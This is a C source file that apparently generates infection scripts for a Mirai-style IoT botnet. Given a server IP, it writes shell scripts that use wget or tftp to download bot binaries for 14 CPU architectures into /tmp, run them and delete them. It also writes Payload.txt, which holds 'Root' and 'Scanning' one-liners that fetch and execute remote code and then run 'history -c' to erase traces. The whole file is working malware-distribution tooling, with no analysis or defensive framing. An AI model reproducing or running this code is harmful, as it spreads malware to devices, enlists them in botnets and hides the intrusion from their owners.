#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char *bins[] = {
    "x86_64",
    "i586",
    "mips",
    "mipsel",
    "armv4l",
    "armv5l",
    "armv6l",
    "armv7l",
    "powerpc",
    "powerpc-440fp",
    "sparc",
    "m68k",
    "i686",
    "sh4"};
char *wget_bashfile_name = "ur0a.sh";
char *tftp1_bashfile_name = "tftp1.sh";
char *tftp2_bashfile_name = "tftp2.sh";
int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        printf("Usage: %s <host ip>\n", argv[0]);
        exit(0);
    }
    char buf[1000] = {0};
    char *ip;
    ip = argv[1];
    sprintf(buf, "echo '#!/bin/sh' >> %s", wget_bashfile_name);
    system(buf);
    sprintf(buf, "echo '#!/bin/sh' >> %s", tftp1_bashfile_name);
    system(buf);
    sprintf(buf, "echo '#!/bin/sh' >> %s", tftp2_bashfile_name);
    system(buf);
    int i;
    for (i = 0; i < 14; ++i)
    {
        sprintf(buf, "echo 'cd /tmp;rm -rf %s;wget http://%s/Simps/%s;chmod +x %s;./%s %s;sh %s %s;rm -rf %s;' >> %s", bins[i], ip, bins[i], bins[i], bins[i], bins[i], bins[i], bins[i], bins[i], wget_bashfile_name);
        system(buf);
        sprintf(buf, "echo 'tftp -g %s -r %s;chmod +x %s;./%s;rm -rf %s;' >> %s", ip, bins[i], bins[i], bins[i], bins[i], tftp1_bashfile_name);
        system(buf);
        sprintf(buf, "echo 'tftp %s -c get %s;chmod +x %s;./%s;rm -rf %s;' >> %s", ip, bins[i], bins[i], bins[i], bins[i], tftp2_bashfile_name);
        system(buf);
    }
    printf("Payload's Stored into Payload.txt\n");
    sprintf(buf, "echo 'Root Payload: cd /tmp;rm -rf x86_64;wget http://%s/Simps/x86_64;chmod +x x86_64;./x86_64 x86_64;rm -rf x86_64;cd;history -c;\r\n\r\nScanning Payload: cd /tmp;rm -rf ur0a.sh;wget http://%s/ur0a.sh;chmod +x ur0a.sh;./ur0a.sh;sh ur0a.sh;rm -rf ur0a.sh;cd;history -c;\r\n\r\nScanning Payload: cd /tmp;rm -rf shell;wget http://%s/shell;chmod +x shell;./shell;sh shell;rm -rf shell;cd;history -c;' >> Payload.txt", ip, ip, ip);
    system(buf);
    return 0;
}